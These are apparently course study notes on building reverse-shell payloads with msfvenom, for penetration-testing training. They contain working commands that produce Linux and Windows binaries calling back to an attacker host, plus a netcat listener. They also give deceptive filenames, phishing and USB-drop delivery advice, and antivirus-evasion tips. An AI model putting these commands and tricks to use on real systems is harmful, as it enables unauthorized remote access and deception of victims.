# NOTE — Crafting Payloads with MSFvenom

## ID
405

## Module
Shells & Payloads

## Kind
notes

## Title
Section 8 — Crafting Payloads with MSFvenom

## Description
Generate standalone payload binaries (`.elf`, `.exe`) with `msfvenom` for cases where you can't reach the target with an MSF exploit module. Covers staged vs stageless naming, format flags, and basic delivery thinking.

## Tags
msfvenom, payloads, staged, stageless, elf, exe, social-engineering

## Commands
- `msfvenom -l payloads` — list every available payload
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > createbackup.elf` — Linux 64-bit reverse-shell ELF
- `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > BonusCompensationPlanpdf.exe` — Windows reverse-shell EXE
- `sudo nc -lvnp 443` — catch the callback

## What This Section Covers
MSFvenom is the standalone payload generator from the Metasploit project. Use it when you can't reach the target via an MSF exploit module — e.g. when delivery is via email, USB drop, phishing link, or any social-engineering chain. Output is a self-contained binary that, when run, calls back to your listener.

## Staged vs Stageless — Naming Convention
| Pattern | Type | Behavior |
|---------|------|----------|
| `linux/x86/shell/reverse_tcp` | **Staged** (note `/`s between segments after the platform) | Tiny initial stage downloads remainder over network |
| `linux/zarch/meterpreter_reverse_tcp` | **Stageless** (`_` separators, no `/` after platform) | Whole payload sent once, no callback for stage 2 |
| `windows/meterpreter/reverse_tcp` | Staged | Default in MSF |
| `windows/meterpreter_reverse_tcp` | Stageless | Single-shot |

### When to pick which
- **Staged** — small initial dropper; smaller initial footprint; needs second network call.
- **Stageless** — single transfer; better for low-bandwidth/high-latency; better for social-eng delivery; sometimes lower detection.

## Anatomy of an MSFvenom Command
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
| Flag | Meaning |
|------|---------|
| `msfvenom` | The tool |
| `-p <payload>` | Payload spec (platform/arch/type) |
| `LHOST=<ip>` | Attacker callback IP |
| `LPORT=<port>` | Attacker callback port |
| `-f <format>` | Output format (`elf`, `exe`, `raw`, `python`, `psh`, `war`, etc.) |
| `> file` | Save to disk |

## Delivery Methods
- Email attachment with social-engineering pretext
- Download link on a website
- USB drop on-site
- Combined with an MSF exploit module to execute remotely
- Self-extracting archive disguised as a document

The Linux example (`createbackup.elf`) gets executed by a sysadmin clicking it from a Downloads folder. The Windows example (`BonusCompensationPlanpdf.exe`) leverages the social trick of hiding the `.exe` after `.pdf` in the name.

## Catching the Callback
```shell
sudo nc -lvnp 443
```
Once the target runs the binary, you get a raw TCP shell — same as bind/reverse shells from earlier. Without encoding/encryption, vanilla payloads will be flagged by AV on most Windows targets.

## Key Takeaways
- **Naming convention is the fastest indicator** of staged/stageless — read the slashes.
- 443 is the conventional egress port for the same reason as reverse shells.
- Vanilla msfvenom output is signatured — you'll need `-e <encoder>` (e.g. `x86/shikata_ga_nai`) or external packers for AV bypass.
- Filename matters for social eng — make it look ordinary or tempting.

## Gotchas
- `-f elf` produces a Linux binary; `-f exe` produces a Windows binary — picking the wrong one for the target = silent fail.
- Stageless payloads are larger; don't blindly choose them when bandwidth/latency matter.
- The default architecture is sometimes `x86`; specify `x64` explicitly for modern hosts.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[07-automating-payloads-metasploit]] | [[09-infiltrating-windows]] →
<!-- AUTO-LINKS-END -->
